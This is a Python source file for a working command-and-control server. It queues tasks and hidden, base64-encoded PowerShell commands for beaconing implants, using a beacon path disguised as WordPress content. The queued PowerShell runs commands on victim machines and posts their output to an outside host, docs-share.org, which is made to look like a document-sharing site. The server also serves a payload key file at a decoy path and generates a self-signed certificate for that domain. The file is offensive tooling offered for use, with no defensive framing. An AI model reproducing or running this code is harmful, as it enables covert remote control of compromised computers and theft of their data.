import http.server
import ssl
import sys
import os
import threading
import base64
import readline
from rich.console import Console

console = Console(highlight=False)

HOST = '0.0.0.0'
PORT = 443
CERT_FILE = 'cert.pem'
KEY_FILE = 'key.pem'
PAYLOAD_KEY_FILE = 'key' 

TASK_QUEUE = []
CMD_QUEUE = []
BEACON_PATH = '/share/wp-content/files/'
RESULTS_PATH = '///results'
PROMPT = "mouse > "
PROMPT_ACTIVE = False
LAST_CMD = ""


def log(msg):
    # If we are not at the prompt (e.g. processing a command), just print the log
    if not PROMPT_ACTIVE:
        console.print(msg)
        return

    buf = ""
    try:
        buf = readline.get_line_buffer()
        if buf.strip() == LAST_CMD:
            buf = ""
    except:
        pass
    
    sys.stdout.write("\r\033[K")
    sys.stdout.flush()
    
    console.print(msg, end="")
    
    sys.stdout.write(f"\n{PROMPT}{buf}")
    sys.stdout.flush()

class C2Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == BEACON_PATH:
            log(f"[sky_blue2][+] Beacon: {self.client_address[0]}[/sky_blue2]")

            if TASK_QUEUE:
                task_file = TASK_QUEUE.pop(0)
                if os.path.exists(task_file):
                    log(f"[grey74][+] Sending task: {task_file}[/grey74]")
                    with open(task_file, "rb") as f:
                        payload = f.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'application/octet-stream')
                    self.send_header('Content-Length', len(payload))
                    self.end_headers()
                    self.wfile.write(payload)
                    return
                else:
                    log(f"[-] Task file not found: {task_file}")

            if CMD_QUEUE:
                cmd = CMD_QUEUE.pop(0)
                cmd_bytes = cmd.encode('utf-8')
                log(f"[grey74][+] Sending command: {cmd}[/grey74]")
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.send_header('Content-Length', len(cmd_bytes))
                self.end_headers()
                self.wfile.write(cmd_bytes)
                return

            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Length', 0)
            self.end_headers()
            return

        log(f"[grey39][+] Request: {self.path} from {self.client_address[0]}[/grey39]")

        if self.path == '/pages/1/static/file':
            if os.path.exists(PAYLOAD_KEY_FILE):
                log(f"[grey39][+] Serving Key: {PAYLOAD_KEY_FILE}[/grey39]")
                with open(PAYLOAD_KEY_FILE, "rb") as f:
                    data = f.read()
                self.send_response(200)
                self.send_header('Content-type', 'application/x-pem-file')
                self.send_header('Content-Length', len(data))
                self.end_headers()
                self.wfile.write(data)
                return
            else:
                log(f"[-] Key file not found: {PAYLOAD_KEY_FILE}")
                self.send_error(404, "File not found")
                return

        self.send_error(404, "Not found")

    def do_POST(self):
        if self.path.endswith('/results'):
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 0:
                output = self.rfile.read(content_length)
                try:
                    decoded = output.decode('utf-8', errors='replace')
                except:
                    decoded = str(output)
                log(f"\n[grey74][+] Output from {self.client_address[0]}:\n{'-'*40}\n{decoded}\n{'-'*40}[/grey74]")
            
            try:
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.send_header('Content-Length', '0')
                self.end_headers()
            except Exception:
                 pass
            return

        self.send_error(404, "Not found")

    def log_message(self, format, *args):
        pass

def command_input_thread():
    global PROMPT_ACTIVE, LAST_CMD
    print()
    while True:
        try:
            PROMPT_ACTIVE = True
            cmd = input(PROMPT).strip()
            PROMPT_ACTIVE = False
            LAST_CMD = cmd
            
            if not cmd:
                continue
            if cmd.lower() == 'q':
                print("[*] Shutting down...")
                os._exit(0)
            if cmd.lower().startswith('task '):
                task_file = cmd[5:].strip()
                TASK_QUEUE.append(task_file)
                console.print(f"[+] Queued task: {task_file}", style="sky_blue2")
            else:
                raw_ps = f'[System.Net.ServicePointManager]::Expect100Continue = $false; $o=({cmd} *>&1 | Out-String); if ([string]::IsNullOrEmpty($o)) {{ $o = " " }}; $b=[System.Text.Encoding]::UTF8.GetBytes($o); iwr https://docs-share.org///results -UseBasicParsing -Method POST -Body $b'
                
                encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
                ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
                CMD_QUEUE.append(ps_cmd)
                console.print(f"[+] Queued command: {cmd}", style="sky_blue2")
        except EOFError:
            break
        except KeyboardInterrupt:
            console.print(f"\n[*] Stopping...", style="red")
            os._exit(0)

def run():
    server_address = (HOST, PORT)
    httpd = http.server.ThreadingHTTPServer(server_address, C2Handler)
    
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        console.print("="*25, style="grey42")
        console.print(f"[*] Listening on https://{HOST}:{PORT}", style="grey42")
        console.print("[*] Clients will beacon every 10s", style="grey42")
        console.print("="*25, style="grey42")
        sys.stdout.flush()
    else:
        print(f"[!] SSL Certs not found ({CERT_FILE}, {KEY_FILE}). Generating self-signed...")
        os.system(f'openssl req -x509 -newkey rsa:4096 -keyout {KEY_FILE} -out {CERT_FILE} -days 365 -nodes -subj "/CN=docs-share.org" 2>/dev/null')
        if os.path.exists(CERT_FILE):
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            console.print(f"[*] Listening on https://{HOST}:{PORT}", style="bold lime")
            sys.stdout.flush()
        else:
             console.print("[!] Failed to generate certs. Exiting.", style="red")
             return

    input_thread = threading.Thread(target=command_input_thread, daemon=True)
    input_thread.start()

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        console.print("\n[*] Stopping", style="red")
        httpd.server_close()

if __name__ == '__main__':
    if len(sys.argv) > 1:
        TASK_QUEUE.append(sys.argv[1])
    run()
